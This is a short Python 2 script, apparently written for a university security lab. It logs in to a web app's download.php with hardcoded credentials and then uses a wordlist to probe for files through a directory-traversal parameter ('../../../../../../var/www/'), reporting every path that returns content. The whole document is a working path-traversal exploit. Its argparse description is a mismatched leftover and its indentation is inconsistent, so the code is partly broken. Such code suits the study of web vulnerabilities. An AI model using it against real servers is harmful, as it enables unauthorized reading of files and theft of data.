#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: T W 
# probing a directory and all files in it with a wordlist, like common_files_names.lst

import re
from argparse import ArgumentParser
import requests

baseurl = 'http://normandy-vm-04.cs.unc.edu/download.php'
url = '?file=../../../../../../var/www/'
user = 'june'
key = 'coffeeprince'
pair = {'user':user, 'pass':key, 'login':'Login'}

if __name__ == "__main__":
  parser = ArgumentParser(description="""Generate mnemonic passwords from text.""")

  parser.add_argument("input_filename", nargs="+", \
    help="input text files")

  args = parser.parse_args()

  s = requests.Session()

  r = s.post(baseurl, data=pair) 
  r = s.post(baseurl, data=pair) 
  head = r.headers 

  count = 0

  for filename in args.input_filename:

    # open file
    with open(filename) as f:

      for line in f:
        line = line.strip() # remove whitespace from ends

	path =  baseurl + url + line


	r = None

	r = s.get(path, cookies=head)

	if r is not None:
		resp = r.text
		count += 1
		if count%1000 == 0:
			print count,' has tried'

		if len(resp)!=0:
			print 'EXIST!!!=' , path 






##################################################################################
print 'probing completed'
